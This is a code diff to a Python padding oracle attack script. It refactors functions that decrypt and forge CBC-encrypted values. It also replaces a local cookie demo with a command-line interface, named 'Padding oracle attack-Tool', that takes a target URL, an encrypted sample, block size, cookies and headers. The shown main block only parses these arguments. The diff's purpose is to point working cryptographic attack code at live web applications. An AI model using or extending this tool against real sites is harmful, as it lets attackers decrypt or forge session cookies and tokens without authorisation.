@@ -1,9 +1,10 @@
 #!/usr/bin/env python
-
 from base64 import b64decode, b64encode
 from binascii import hexlify, unhexlify
 from cookie import Cookie
 from urllib.parse import quote, unquote
+import argparse
+import requests
 
 def decrypt_last_block(mycookie, ciphertext, block_size, print_result = True):
     ciphertext_to_decrypt = ciphertext[-block_size:]
@@ -95,13 +96,13 @@ def encrypt_attact(mycookie, ciphertext_sample, block_size, plaintext, encoding 
     ciphertext_sample = b64decode(ciphertext_sample)
 
     #padding plaintext
-    p = block_size - (len(plaintext) % block_size)
-    plaintext = plaintext.encode() + bytes([p] * p)
+    padding = block_size - (len(plaintext) % block_size)
+    plaintext = plaintext.encode() + bytes([padding] * padding)
 
     if len(ciphertext_sample) >= len(plaintext) + block_size:
         ciphertext_sample = ciphertext_sample[:len(plaintext) + block_size]
     else:
-        k = len(plaintext) + block_size - len(ciphertext_sample)\
+        k = len(plaintext) + block_size - len(ciphertext_sample)
         #padding with '0'
         ciphertext_sample += bytes([0] * k)
 
@@ -135,14 +136,39 @@ def encrypt_attact(mycookie, ciphertext_sample, block_size, plaintext, encoding 
 
     return ciphertext
 
-if __name__ == "__main__":
-    message = "The MAC bug allows an attacker to submit"
-    mycookie = Cookie()
-    ciphertext = mycookie.get_ciphertext(message)
-    #decrypt_attack(mycookie, ciphertext, 16)
+def parse_options():
+    parser = argparse.ArgumentParser(usage='%(prog)s <URL> <EncryptedSample> <BlockSize> [options]',
+                                     description='Padding oracle attack-Tool @Qin',
+                                     formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument('URL', type=str, help='The target URL')
+    parser.add_argument('EncryptedSample', type=str, help='The encrypted value you want to test. Must also be present in the URL, PostData or a Cookie')
+    parser.add_argument('BlockSize', type=int, help='The block size being used by the algorithm')
+
+
+    parser.add_argument('--cookies', type=str, help='Cookies (name1=value1; name2=value2)')
+    parser.add_argument('--encoding', type=int, help='Encoding Format of Sample (Default 0)[0-2]: 0=Base64, 1=Base64+UrlToken, 2=Hex')
+    parser.add_argument('--headers', type=str, help='Custom Headers (name1::value1;name2::value2)')
+    parser.add_argument('--plaintext', type=str, help='Plain-Text to Encrypt')
     
-    plain = "IV's which are processed by the server in CBC mode"
-    cipher = encrypt_attact(mycookie, ciphertext, 16, plain, print_result = True)
+    args = parser.parse_args()
+
+    return args
+
+
+if __name__ == "__main__":
+    args = parse_options()
+
+    url = args.URL
+    encrypted_sample = args.EncryptedSample
+    block_size = args.BlockSize
+
+    # message = "The MAC bug allows an attacker to submit"
+    # mycookie = Cookie()
+    # ciphertext = mycookie.get_ciphertext(message)
+    # #decrypt_attack(mycookie, ciphertext, 16)
+    
+    # plain = "IV's which are processed by the server in CBC mode"
+    # cipher = encrypt_attact(mycookie, ciphertext, 16, plain, print_result = True)
 
 
     
